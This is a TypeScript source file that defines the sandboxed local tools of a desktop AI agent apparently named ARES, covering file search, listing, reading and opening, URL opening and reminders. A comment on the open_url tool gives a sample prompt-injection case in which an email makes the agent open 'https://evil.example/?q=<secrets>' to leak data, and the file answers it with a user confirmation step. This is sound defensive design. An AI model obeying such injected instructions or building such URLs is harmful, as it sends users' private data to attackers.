import fs from 'node:fs/promises';
import path from 'node:path';
import type { FsSandbox } from '../services/fsSandbox.js';
import type { Launcher } from '../services/launcher.js';
import type { Scheduler } from '../services/scheduler.js';
import type { AgentTool, ToolOutput } from './types.js';

const MAX_READ_CHARS = 20_000;

interface Deps {
  fs: FsSandbox;
  launcher: Launcher;
  scheduler: Scheduler;
}

const str = (v: unknown) => (typeof v === 'string' ? v : '');

/** ARES's own tools, always available to the agent. All stay inside the sandbox. */
export function localTools({ fs: sandbox, launcher, scheduler }: Deps): AgentTool[] {
  const tool = (
    name: string,
    description: string,
    properties: Record<string, unknown>,
    required: string[],
    call: (args: Record<string, unknown>) => Promise<ToolOutput>,
    requiresConfirmation = false,
  ): AgentTool => ({
    name,
    title: `ares · ${name}`,
    description,
    inputSchema: { type: 'object', properties, required, additionalProperties: false },
    requiresConfirmation,
    source: 'ares',
    call: (args) => call(args).catch((err: Error) => ({ text: err.message, isError: true })),
  });

  const folderArg = { folder: { type: 'string', description: 'Folder to look in, e.g. "Documents" or "~/Projects". Defaults to the home folder.' } };

  return [
    tool(
      'files_search',
      "Find files and folders on the user's computer by (partial) name.",
      { query: { type: 'string', description: 'Part of the file or folder name.' }, ...folderArg },
      ['query'],
      async ({ query, folder }) => {
        const start = await sandbox.location(str(folder));
        const hits = await sandbox.search(start, str(query), 25);
        return { text: hits.length ? hits.map((h) => sandbox.display(h)).join('\n') : 'No matches.' };
      },
    ),
    tool('files_list', 'List the contents of a folder.', folderArg, [], async ({ folder }) => {
      const dir = await sandbox.location(str(folder));
      const entries = await fs.readdir(dir, { withFileTypes: true });
      const names = entries.filter((e) => !e.name.startsWith('.')).map((e) => (e.isDirectory() ? `${e.name}/` : e.name));
      return { text: `${sandbox.display(dir)}:\n${names.slice(0, 200).join('\n') || '(empty)'}` };
    }),
    tool(
      'files_read',
      'Read a text file (first 20,000 characters).',
      { path: { type: 'string', description: 'Path like "~/Documents/notes.txt".' } },
      ['path'],
      async ({ path: p }) => {
        const file = await sandbox.resolve(str(p));
        const buffer = await fs.readFile(file);
        if (buffer.subarray(0, 8000).includes(0)) return { text: 'Binary file; cannot read as text.', isError: true };
        const text = buffer.toString('utf8');
        return { text: text.length > MAX_READ_CHARS ? `${text.slice(0, MAX_READ_CHARS)}\n…[truncated]` : text };
      },
    ),
    tool(
      'open_file',
      'Open a file or folder in its default app on the user\'s screen.',
      { path: { type: 'string', description: 'Path like "~/Documents/report.pdf".' } },
      ['path'],
      async ({ path: p }) => {
        const target = await sandbox.resolve(str(p));
        await fs.access(target);
        await launcher.openPath(target);
        return { text: `Opened ${path.basename(target)}.` };
      },
    ),
    tool(
      'open_url',
      'Open a web page in the default browser.',
      { url: { type: 'string', description: 'An http or https URL.' } },
      ['url'],
      async ({ url }) => {
        await launcher.openUrl(str(url));
        return { text: 'Opened.' };
      },
      // A URL can carry data out (an injected instruction in an email could say
      // "open https://evil.example/?q=<secrets>"), so the user approves each one.
      true,
    ),
    tool(
      'set_reminder',
      'Schedule a spoken reminder.',
      {
        text: { type: 'string', description: 'What to remind the user about.' },
        when: { type: 'string', description: 'Local date and time, ISO 8601, e.g. "2026-10-14T09:00".' },
      },
      ['text', 'when'],
      async ({ text, when }) => {
        const due = new Date(str(when));
        if (Number.isNaN(due.getTime())) return { text: 'Invalid "when".', isError: true };
        if (due.getTime() <= Date.now()) return { text: 'That time has already passed.', isError: true };
        scheduler.add('reminder', str(text), due.getTime());
        return { text: `Reminder set for ${due.toLocaleString()}.` };
      },
    ),
  ];
}
